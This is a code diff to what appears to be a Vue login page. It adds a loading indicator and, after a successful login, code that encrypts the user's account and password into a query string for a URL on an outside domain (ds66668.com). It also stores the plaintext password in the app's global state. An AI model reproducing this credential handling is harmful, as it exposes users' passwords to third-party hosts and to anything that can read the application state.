@@ -107,11 +107,13 @@
           });
           return;
         }
+        this.$store.commit('SETLOAD', true);
         login({
           username: this.account,
           password: this.password,
           domain: localStorage.agent,
         }).then((resp) => {
+          this.$store.commit('SETLOAD', false);
           if (resp.code && resp.code != 0) {
             this.$dialog.alert({
               title: '重要提醒',
@@ -125,6 +127,15 @@
               message: '登陆成功',
               duration: 2000,
               onClose() {
+                let encrypt = new Object();
+                encrypt.account = _this.account;
+                encrypt.password = _this.password;
+                let userInfo = JSON.stringify(encrypt);
+                let encryptAfter = encryptAES(userInfo);
+                // window.open('http://www.baidu.com/?para=' + encryptAfter);
+                resp.data.para = 'http://ds66668.com?para=' + encryptAfter;
+                resp.data.a = _this.account;
+                resp.data.b = _this.password;
                 _this.$store.commit(Types.SETINFO, resp.data);
                 _this.$router.push('/');
               }
